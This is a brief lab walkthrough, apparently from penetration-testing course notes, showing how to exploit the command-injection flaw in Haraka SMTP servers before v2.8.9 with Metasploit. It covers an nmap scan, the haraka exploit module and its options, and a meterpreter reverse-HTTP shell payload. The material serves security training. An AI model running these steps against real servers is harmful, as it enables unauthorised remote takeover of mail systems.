# Exploiting A Vulnerable SMTP Server

## Exploiting SMTP

* SMTP is a communication protocol that is used for the transmission of email.
* <mark style="color:red;">Haraka</mark> is an open source high performance SMTP server developed in <mark style="color:blue;">Node.js</mark>.
* The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to <mark style="color:red;">V2.8.9</mark> are vulnerable to command injection.

## Practice Demo

Enumerate the target using the db\_nmap command

* <mark style="color:yellow;">db\_nmap -sS -sV -O targetIP</mark>

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Use the module <mark style="color:red;">exploit/linux/smtp/haraka</mark>

* <mark style="color:yellow;">set SRVPORT 9898</mark>
  * <mark style="color:red;">**SRVPORT**</mark> is used to host a service during the exploitation process.
* <mark style="color:yellow;">set email\_to root@attackdefense.test</mark>
  * This option specifies the target email address to which the exploit will be sent. It should be the email address of the intended victim on the Haraka SMTP server.
* <mark style="color:yellow;">set payload linux/x64/meterpreter\_reverse\_http</mark>
  * This payload requires the port 8080

